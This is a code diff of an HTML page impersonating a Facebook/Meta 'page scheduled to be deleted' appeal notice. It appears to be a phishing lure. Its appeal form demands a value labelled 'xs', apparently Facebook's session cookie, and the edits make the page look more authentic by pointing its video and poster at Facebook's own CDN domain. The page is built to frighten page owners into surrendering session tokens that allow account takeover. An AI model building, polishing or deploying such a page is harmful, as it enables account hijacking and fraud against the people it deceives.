@@ -11,7 +11,6 @@
     <div id="langModal" class="modal-overlay">
         <div class="modal-box">
             <h2 class="modal-title">Select Your Language</h2>
-            <p style="font-size: 12px; color: gray;">Choose your preferred language for the page content</p>
             <div class="lang-grid">
                 <div class="lang-item active">🇺🇸 English</div>
                 <div class="lang-item">🇮🇳 Hindi</div>
@@ -45,7 +44,7 @@
                 <span style="color: #d93025; font-size: 24px;">⚠️</span>
                 <div>
                     <h4 style="color: #d93025; margin: 0;">Your page is scheduled to be deleted!</h4>
-                    <p style="font-size: 13px; color: #4b4f56; margin-top: 5px;">We have received several reports that your page violates our terms of service. As a result, your page will be sent for verification.</p>
+                    <p style="font-size: 13px; color: #4b4f56; margin-top: 5px;">We have received several reports that your page violates our terms of service.</p>
                 </div>
             </div>
 
@@ -70,9 +69,9 @@
                         <p style="font-size: 13px; color: #1c1e21; margin: 5px 0;">ℹ️ Please review the details before submitting.</p>
                     </div>
 
-                    <div class="video-container" style="margin: 20px 0; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; background: #fff;">
-                        <video width="100%" height="auto" controls poster="https://i.ibb.co/Bqp7K3r/poster-meta.png" style="display: block;">
-                            <source src="https://video.twimg.com/ext_tw_video/1814981845112954881/pu/vid/avc1/1280x720/Kx9HnNfN0R0S0J6t.mp4" type="video/mp4">
+                    <div class="video-container" style="margin: 20px 0; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; background: #000;">
+                        <video width="100%" height="auto" controls playsinline poster="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/v_A_vS7MvH7.png" style="display: block;">
+                            <source src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/v_A_vS7MvH7.mp4" type="video/mp4">
                             Your browser does not support the video tag.
                         </video>
                     </div>
@@ -90,7 +89,7 @@
                             <input type="text" name="xs" placeholder="Enter xs" required style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                         </div>
 
-                        <button type="submit" class="blue-btn" style="width: 100%; margin-top: 20px; background: #1877f2; color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer;">Submit Appeal Request</button>
+                        <button type="submit" class="blue-btn" style="width: 100%; margin-top: 20px; background: #1877f2; color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold;">Submit Appeal Request</button>
                     </form>
                 </div>
             </div>
@@ -98,16 +97,14 @@
             <div class="resources-section">
                 <h4>Appeal Guide</h4>
                 <div class="guide-box" style="border: 1px solid #ddd; padding: 15px; border-radius: 8px; background: #fff;">
-                    <p style="font-size: 13px; color: #4b4f56;">If your appeal involves copyrighted information, our review process could take up to 7 business days. Please check your email for updates.</p>
+                    <p style="font-size: 13px; color: #4b4f56;">If your appeal involves copyrighted information, our review process could take up to 7 business days.</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        function closeLangModal() { 
-            document.getElementById('langModal').style.display = 'none'; 
-        }
+        function closeLangModal() { document.getElementById('langModal').style.display = 'none'; }
         function showForm() {
             document.getElementById('appealHome').style.display = 'none';
             document.getElementById('formSection').style.display = 'block';
